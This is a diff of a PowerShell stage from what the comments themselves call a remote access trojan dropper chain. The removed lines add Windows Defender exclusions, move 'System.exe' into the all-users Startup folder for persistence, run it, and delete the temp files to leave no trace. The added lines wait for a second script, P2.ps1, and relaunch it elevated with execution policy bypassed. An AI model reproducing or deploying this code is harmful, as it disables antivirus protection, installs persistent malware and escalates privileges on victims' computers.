@@ -1,22 +1,19 @@
-# 1. Sets the path to the temp folder where Lua put the files
+$ErrorActionPreference = "Stop"
 $tempDir = "$env:TEMP\rt"
-$exePath = "$tempDir\System.exe"
-$startupPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\System.exe"
+$p2Path = "$tempDir\P2.ps1"
 
-# 2. Adds Defender Exclusions (Requires Admin)
-#    Without this, Defender might quarantine System.exe the moment it's moved.
-Add-MpPreference -ExclusionPath $tempDir
-Add-MpPreference -ExclusionPath $startupPath
-Add-MpPreference -ExclusionProcess "System.exe"
+# Wait for P2.ps1
+$timeout = 30
+while (-not (Test-Path $p2Path) -and $timeout -gt 0) {
+    Start-Sleep -Seconds 1
+    $timeout--
+}
 
-# 3. Moves the malware to a persistent location (Requires Admin)
-#    ProgramData is visible to all users, so the RAT runs for everyone.
-Move-Item -Path $exePath -Destination $startupPath -Force
+if (-not (Test-Path $p2Path)) {
+    Write-Error "P2.ps1 not found"
+    exit 1
+}
 
-# 4. Runs the malware once (Requires Admin)
-#    Ensures the binary works and establishes its initial connection.
-Start-Process $startupPath -Wait
-
-# 5. Cleans up the temp folder (Requires Admin)
-#    Deletes P1, P2, and the original System.exe to leave no trace in %TEMP%.
-Start-Process powershell -ArgumentList "-NoProfile -Command `"Start-Sleep -Seconds 5; Remove-Item -Recurse -Force '$tempDir'`""
+# Elevate
+$argString = "-NoProfile -ExecutionPolicy Bypass -File `"$p2Path`""
+Start-Process powershell -Verb RunAs -ArgumentList $argString -Wait
